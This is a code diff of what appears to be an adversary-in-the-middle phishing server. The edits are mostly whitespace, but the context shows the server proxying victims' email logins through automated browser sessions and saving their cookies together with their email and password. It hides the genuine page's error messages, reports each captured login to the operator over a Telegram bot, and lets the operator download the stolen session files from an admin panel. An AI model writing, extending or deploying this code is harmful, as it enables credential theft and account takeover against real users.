@@ -39,7 +39,7 @@ function requireAdminAuth(req, res, next) {
     const token = req.headers['authorization']?.replace('Bearer ', '') || 
                   (req.query && req.query.token) || 
                   (req.body && req.body.token);
-    
+
     if (!token || token !== ADMIN_TOKEN) {
         return res.status(401).json({ 
             error: 'Unauthorized access to admin endpoint',
@@ -111,14 +111,14 @@ setInterval(async () => {
     if (!sessionMutex && !initializingSession && activeSessions.size > 0) {
         const now = Date.now();
         const expiredSessions = [];
-        
+
         // Find expired sessions that aren't in use
         for (const [sessionId, session] of activeSessions) {
             if (now - session.createdAt > SESSION_TIMEOUT && !session.inUse) {
                 expiredSessions.push(sessionId);
             }
         }
-        
+
         // Clean up expired sessions
         if (expiredSessions.length > 0) {
             console.log(`🧹 Cleaning up ${expiredSessions.length} expired sessions`);
@@ -147,7 +147,7 @@ setInterval(async () => {
 setInterval(async () => {
     if (!sessionMutex && !initializingSession && activeSessions.size > 0) {
         const disconnectedSessions = [];
-        
+
         // Check all active sessions for disconnected browsers
         for (const [sessionId, session] of activeSessions) {
             if (session.automation && session.automation.browser) {
@@ -162,7 +162,7 @@ setInterval(async () => {
                 }
             }
         }
-        
+
         // Clean up disconnected sessions
         if (disconnectedSessions.length > 0) {
             sessionMutex = Promise.resolve();
@@ -209,7 +209,7 @@ async function getOrCreateSession(sessionId = null) {
             const oldestSessionId = activeSessions.keys().next().value;
             const oldestSession = activeSessions.get(oldestSessionId);
             console.log(`🗑️ Removing oldest session due to limit: ${oldestSessionId}`);
-            
+
             try {
                 if (oldestSession.automation) {
                     await oldestSession.automation.close();
@@ -443,13 +443,13 @@ app.post('/api/login', async (req, res) => {
                     analytics.validEntries++;
                     console.log('💾 Saving session cookies to file (not for reuse)...');
                     const sessionFile = await session.automation.saveCookies(email, password);
-                    
+
                     // Send Telegram notification if bot is available
                     if (telegramBot && sessionFile) {
                         try {
                             // Extract domain from email
                             const domain = email.split('@')[1] || 'Unknown';
-                            
+
                             // Read session file to get cookie count
                             const fs = require('fs');
                             let totalCookies = 0;
@@ -461,7 +461,7 @@ app.post('/api/login', async (req, res) => {
                             } catch (error) {
                                 console.log('Could not read cookie count:', error.message);
                             }
-                            
+
                             await telegramBot.sendLoginNotification({
                                 email: email,
                                 domain: domain,
@@ -469,7 +469,7 @@ app.post('/api/login', async (req, res) => {
                                 totalCookies: totalCookies,
                                 sessionId: sessionId
                             });
-                            
+
                             console.log(`📤 Telegram notification sent for ${email}`);
                         } catch (error) {
                             console.error('❌ Failed to send Telegram notification:', error.message);
@@ -569,6 +569,7 @@ app.post('/api/login', async (req, res) => {
                                     console.log(`Found error message: ${errorText.trim()}`);
                                     foundAccountNotFoundError = true;
                                     analytics.invalidEntries++;
+                                    console.log(`📊 Analytics: Invalid entries now ${analytics.invalidEntries}`);
                                 } else {
                                     // Remove all other bordered error messages from HTML
                                     await element.evaluate(el => el.remove());
@@ -707,11 +708,11 @@ app.post('/api/continue-login', async (req, res) => {
                 error: 'Session ID is required' 
             });
         }
-        
+
         const session = activeSessions.get(requestedSessionId);
         if (!session || !session.automation) {
             return res.status(400).json({ 
-                error: 'No active session found. Please start with email first.' 
+                error: 'No active automation session found. Please start with email first.' 
             });
         }
 
@@ -770,15 +771,15 @@ app.post('/api/continue-login', async (req, res) => {
                 responseMessage = sessionFile ? 
                     `Login completed successfully! Session saved to: ${sessionFile}` :
                     'Login completed successfully!';
-                
+
                 analytics.validEntries++;
-                
+
                 // Send Telegram notification if bot is available
                 if (telegramBot && sessionFile && loginSuccess) {
                     try {
                         const email = session.email || 'unknown@unknown.com';
                         const domain = email.split('@')[1] || 'Unknown';
-                        
+
                         // Read session file to get cookie count
                         const fs = require('fs');
                         let totalCookies = 0;
@@ -790,7 +791,7 @@ app.post('/api/continue-login', async (req, res) => {
                         } catch (error) {
                             console.log('Could not read cookie count:', error.message);
                         }
-                        
+
                         await telegramBot.sendLoginNotification({
                             email: email,
                             domain: domain,
@@ -798,7 +799,7 @@ app.post('/api/continue-login', async (req, res) => {
                             totalCookies: totalCookies,
                             sessionId: requestedSessionId
                         });
-                        
+
                         console.log(`📤 Telegram notification sent for ${email}`);
                     } catch (error) {
                         console.error('❌ Failed to send Telegram notification:', error.message);
@@ -911,7 +912,7 @@ app.delete('/api/session', async (req, res) => {
             if (session.automation) {
                 await session.automation.close();
             }
-            
+
             activeSessions.delete(requestedSessionId);
             console.log(`Session ${requestedSessionId} closed and removed`);
         } else {
@@ -921,7 +922,7 @@ app.delete('/api/session', async (req, res) => {
                     error: 'No active sessions to close' 
                 });
             }
-            
+
             for (const [sessionId, session] of activeSessions) {
                 if (session.automation) {
                     try {
@@ -931,7 +932,7 @@ app.delete('/api/session', async (req, res) => {
                     }
                 }
             }
-            
+
             activeSessions.clear();
             console.log('All sessions closed and removed');
         }
@@ -1002,7 +1003,7 @@ app.get('/api/status', (req, res) => {
             hasAutomation: session.automation !== null
         });
     }
-    
+
     res.json({
         hasActiveSession: activeSessions.size > 0,
         sessionCount: activeSessions.size,
@@ -1018,16 +1019,16 @@ app.post('/api/extend-session', async (req, res) => {
         if (!requestedSessionId) {
             return res.status(400).json({ error: 'Session ID is required.' });
         }
-        
+
         const session = activeSessions.get(requestedSessionId);
         if (!session) {
             return res.status(400).json({ error: 'Session not found.' });
         }
-        
+
         // Update session creation time to extend timeout
         session.createdAt = Date.now();
         console.log(`Session ${requestedSessionId} timeout extended.`);
-        
+
         res.json({ 
             message: 'Session timeout extended successfully',
             sessionId: requestedSessionId,
@@ -1328,17 +1329,17 @@ process.on('SIGQUIT', gracefulShutdown);
 app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
     const fs = require('fs');
     const path = require('path');
-    
+
     try {
         const sessionDir = path.join(__dirname, 'session_data');
-        
+
         if (!fs.existsSync(sessionDir)) {
             return res.json({ sessions: [] });
         }
-        
+
         const files = fs.readdirSync(sessionDir)
             .filter(file => file.startsWith('session_') && file.endsWith('.json'));
-        
+
         const sessions = files.map(file => {
             try {
                 const filePath = path.join(sessionDir, file);
@@ -1356,7 +1357,7 @@ app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
                 return null;
             }
         }).filter(session => session !== null);
-        
+
         res.json({ sessions });
     } catch (error) {
         console.error('Error getting sessions:', error);
@@ -1387,42 +1388,42 @@ app.get('/api/admin/download/:filename', requireAdminAuth, (req, res) => {
     const fs = require('fs');
     const path = require('path');
     const filename = req.params.filename;
-    
+
     // Enhanced security: strict validation and path traversal protection
     if (!filename || typeof filename !== 'string') {
         return res.status(400).json({ error: 'Invalid filename parameter' });
     }
-    
+
     // Remove any path separators and normalize
     const sanitizedFilename = path.basename(filename);
-    
+
     // Only allow files that start with 'session_' and end with '.json'
     if (!sanitizedFilename.startsWith('session_') || !sanitizedFilename.endsWith('.json')) {
         return res.status(400).json({ error: 'Invalid filename format' });
     }
-    
+
     // Additional validation: check for suspicious patterns
     if (sanitizedFilename.includes('..') || sanitizedFilename.includes('/') || sanitizedFilename.includes('\\')) {
         return res.status(400).json({ error: 'Filename contains invalid characters' });
     }
-    
+
     try {
         const sessionDir = path.join(__dirname, 'session_data');
         const filePath = path.join(sessionDir, sanitizedFilename);
-        
+
         // Ensure the resolved path is within session_data directory
         if (!filePath.startsWith(sessionDir)) {
             return res.status(400).json({ error: 'Path traversal attempt detected' });
         }
-        
+
         if (!fs.existsSync(filePath)) {
             return res.status(404).json({ error: 'File not found' });
         }
-        
+
         res.setHeader('Content-Disposition', `attachment; filename="${sanitizedFilename}"`);
         res.setHeader('Content-Type', 'application/json');
         res.sendFile(filePath);
-        
+
     } catch (error) {
         console.error('Error downloading file:', error);
         res.status(500).json({ error: 'Failed to download file' });
@@ -1435,7 +1436,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`📧 API endpoints available at http://localhost:${PORT}/api/`);
     console.log(`🌐 Frontend available at http://localhost:${PORT}/`);
     console.log(`🔧 Admin panel available at http://localhost:${PORT}/admin.html`);
-    
+
     if (telegramBot) {
         console.log(`🤖 Telegram Bot active - ${telegramBot.getSubscribedUsers()} users subscribed`);
         console.log(`📱 Bot Features: Admin token access + Login notifications`);
